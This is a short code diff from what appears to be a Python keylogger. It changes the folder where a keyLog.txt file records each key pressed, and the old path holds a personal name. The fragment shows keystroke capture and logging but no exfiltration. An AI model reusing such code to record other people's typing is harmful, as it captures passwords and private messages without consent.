@@ -7,7 +7,7 @@ def on_press(key):
     logging.info(str(key))
     # code here
 
-log_dir =r"C:/Users/jobel johny/Desktop/"
+log_dir =r"C:/Users/john/Documents/"
 
 logging.basicConfig(filename=(log_dir+"keyLog.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')
 
